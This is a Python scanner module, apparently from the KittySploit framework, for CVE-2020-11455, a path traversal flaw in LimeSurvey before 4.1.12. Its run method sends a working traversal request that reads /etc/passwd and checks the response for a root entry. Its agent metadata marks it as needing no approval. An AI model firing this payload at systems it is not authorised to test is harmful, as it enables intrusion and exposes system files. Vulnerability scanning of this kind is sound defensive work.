#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""LimeSurvey before 4."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'LimeSurvey 4.1.11 - Local File Inclusion Detection',
        'description': 'LimeSurvey before 4.1.12+200324 is vulnerable to local file inclusion because it contains a path traversal vulnerability in application/controllers/admin/LimeSurveyFileManager.php.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'lfi', 'edb', 'packetstorm', 'limesurvey', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/48297',
            'https://github.com/LimeSurvey/LimeSurvey/commit/daf50ebb16574badfb7ae0b8526ddc5871378f1b',
            'http://packetstormsecurity.com/files/157112/LimeSurvey-4.1.11-Path-Traversal.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-11455',
            'https://github.com/KayCHENvip/vulnerability-poc',
        ],
        'cve': 'CVE-2020-11455',
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php/admin/filemanager/sa/getZipFile?path=/../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='critical',
                reason="LimeSurvey 4.1.11 - Local File Inclusion detected",
                path='/index.php/admin/filemanager/sa/getZipFile?path=/../../../../../../../etc/passwd',
            )
            return True
        return False

